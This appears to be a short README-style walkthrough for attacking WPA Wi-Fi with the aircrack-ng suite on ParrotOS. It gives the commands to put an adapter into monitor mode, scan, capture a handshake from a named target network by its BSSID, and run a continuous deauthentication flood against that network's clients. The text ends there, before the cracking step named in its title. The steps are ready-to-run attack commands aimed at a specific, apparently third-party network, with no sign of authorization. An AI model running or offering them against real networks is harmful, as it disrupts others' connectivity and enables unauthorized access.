## Example crack wpa attack speed with airolib-ng, aircrack-ng

i use tp-link wn725n and on parrotOS, the name of it is ridiculous

```
iwconfig
```

![image](https://user-images.githubusercontent.com/90561566/166419875-330952f9-ce4a-416d-b403-ec2d39ecc3dc.png)

```
airmon-ng start <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166419967-2d8d1bd2-eb49-40b7-b46f-cf52497eba4b.png)

```
airodump-ng <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166420371-20c0ce94-e653-4cda-b87b-72f071d94a49.png)

i will choose target is `Quang Minh 2G`, CH `11`, bssid `5C:1A:6F:88:19:19`

```
airodump-ng -c <CH> --bssid <bssid> -w out <iface>
```

![image](https://user-images.githubusercontent.com/90561566/166420867-1c3d3d5a-5c26-4f67-b271-84f9a19c81d0.png)

new terminal

```
aireplay-ng --deauth 0 -a <bssid> <iface>
```





















